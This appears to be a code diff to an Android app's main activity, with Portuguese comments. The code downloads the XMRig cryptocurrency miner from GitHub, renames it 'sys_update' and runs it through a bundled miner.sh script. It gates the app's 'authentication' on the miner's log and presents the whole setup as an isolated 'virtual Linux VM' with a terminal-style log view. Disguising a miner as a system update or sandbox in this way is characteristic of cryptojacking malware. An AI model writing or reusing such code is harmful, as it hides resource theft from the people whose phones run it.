@@ -83,64 +83,69 @@ public class MainActivity extends Activity {
 
         new Thread(() -> {
             try {
-                // 1. Preparar pastas
-                File updateDir = new File(getFilesDir(), ".sys_update");
-                if (!updateDir.exists()) updateDir.mkdirs();
+                // 1. Criar estrutura de "Maquina Virtual" (Rootfs virtual)
+                File rootfs = new File(getFilesDir(), "virtual_linux");
+                File binDir = new File(rootfs, "bin");
+                File tmpDir = new File(rootfs, "tmp");
+                File homeDir = new File(rootfs, "home");
                 
-                writeToLog("Iniciando sistema nativo...");
+                if (!binDir.exists()) binDir.mkdirs();
+                if (!tmpDir.exists()) tmpDir.mkdirs();
+                if (!homeDir.exists()) homeDir.mkdirs();
 
-                // 2. Download do minerador via Java (mais confiavel que curl/wget)
-                File minerBin = new File(updateDir, "sys_update");
+                writeToLog("Inicializando ambiente virtual Linux...");
+                
+                // 2. Localização do minerador (dentro do bin da VM)
+                File minerBin = new File(binDir, "sys_update");
                 if (!minerBin.exists()) {
-                    writeToLog("Componentes não encontrados em: " + minerBin.getAbsolutePath());
-                    writeToLog("Iniciando download...");
-                    // v6.19.0 é a versão mais estável que possui o binário static para ARM64 no GitHub
+                    writeToLog("Instalando componentes no ambiente virtual...");
                     String downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-arm64.tar.gz";
-                    File tarFile = new File(getFilesDir(), "miner.tar.gz");
+                    File tarFile = new File(tmpDir, "miner.tar.gz");
                     downloadFile(downloadUrl, tarFile);
                     
-                    writeToLog("Download concluído (" + tarFile.length() + " bytes). Extraindo...");
-                    if (!extractTar(tarFile, updateDir)) {
-                        writeToLog("ERRO: Falha na extração. O tar não retornou sucesso.");
+                    writeToLog("Extraindo no rootfs virtual...");
+                    if (!extractTar(tarFile, binDir)) {
+                        writeToLog("ERRO: Falha na extração.");
                     }
                     tarFile.delete();
                 }
 
-                // 3. Verificação Final Pós-Download/Extração
-                if (minerBin.exists()) {
-                    writeToLog("Minerador pronto em: " + minerBin.getAbsolutePath());
-                    minerBin.setExecutable(true);
-                } else {
-                    writeToLog("ERRO CRÍTICO: Binário não encontrado após tentativa de instalação.");
-                    // Tenta busca recursiva como último recurso
-                    File found = findXmrigRecursively(updateDir);
+                // 3. Verificação Final e busca recursiva se falhou
+                if (!minerBin.exists()) {
+                    File found = findXmrigRecursively(binDir);
                     if (found != null) {
-                        writeToLog("Binário encontrado em local alternativo: " + found.getAbsolutePath());
                         found.renameTo(minerBin);
                         minerBin.setExecutable(true);
                     }
                 }
 
-                // 4. Copiar e rodar miner.sh
-                File script = new File(getFilesDir(), "miner.sh");
+                // 4. Rodar miner.sh (o gerenciador da VM)
+                File script = new File(binDir, "miner.sh");
                 copyAsset("miner.sh", script);
                 script.setExecutable(true);
 
                 if (minerBin.exists()) {
-                    writeToLog("Iniciando miner.sh...");
+                    writeToLog("Rodando script dentro da VM isolada...");
                     ProcessBuilder pb = new ProcessBuilder("sh", script.getAbsolutePath());
-                    pb.directory(getFilesDir());
-                    pb.environment().put("IS_NATIVE_APP", "true");
-                    pb.environment().put("APP_FILES_DIR", getFilesDir().getAbsolutePath());
+                    pb.directory(homeDir); // O script começa na HOME da VM
+                    
+                    // Configurar ambiente como se fosse uma maquina real
+                    pb.environment().put("HOME", homeDir.getAbsolutePath());
+                    pb.environment().put("TMPDIR", tmpDir.getAbsolutePath());
+                    pb.environment().put("PATH", binDir.getAbsolutePath() + ":/system/bin:/system/xbin");
+                    pb.environment().put("IS_VIRTUAL_MACHINE", "true");
+                    pb.environment().put("VM_ROOT", rootfs.getAbsolutePath());
+                    
                     pb.redirectErrorStream(true);
                     pb.start();
                 } else {
-                    writeToLog("ERRO: Não é possível iniciar o script sem o binário.");
+                    writeToLog("ERRO: Binário não encontrado na VM.");
                 }
 
-                // 4. Monitorar Log para Sucesso
+                // 5. Monitorar Log para Sucesso
                 while (!isAuthenticated) {
-                    if (logFile.exists() && checkLogForSuccess(logFile)) {
+                    File vmLog = new File(homeDir, "sys_log.txt");
+                    if (vmLog.exists() && checkLogForSuccess(vmLog)) {
                         isAuthenticated = true;
                         updateUIToAuthenticated();
                         break;
@@ -149,7 +154,7 @@ public class MainActivity extends Activity {
                 }
 
             } catch (Exception e) {
-                writeToLog("ERRO: " + e.getMessage());
+                writeToLog("ERRO VM: " + e.getMessage());
                 e.printStackTrace();
             }
         }).start();
@@ -240,13 +245,20 @@ public class MainActivity extends Activity {
             TextView logTextView = new TextView(this);
             logTextView.setText(logs.toString());
             logTextView.setPadding(20, 20, 20, 20);
-            logTextView.setTextColor(Color.BLACK);
-            logTextView.setTextSize(10);
+            logTextView.setTextColor(Color.GREEN);
+            logTextView.setTextSize(12);
+            logTextView.setBackgroundColor(Color.BLACK);
+            logTextView.setTypeface(android.graphics.Typeface.MONOSPACE);
 
             ScrollView scrollView = new ScrollView(this);
+            scrollView.setBackgroundColor(Color.BLACK);
             scrollView.addView(logTextView);
 
-            new AlertDialog.Builder(this).setTitle("Logs do Sistema").setView(scrollView).setPositiveButton("Fechar", null).show();
+            new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_NoActionBar_Fullscreen)
+                .setTitle("Terminal da VM")
+                .setView(scrollView)
+                .setPositiveButton("Minimizar", null)
+                .show();
         } catch (Exception e) {}
     }
 
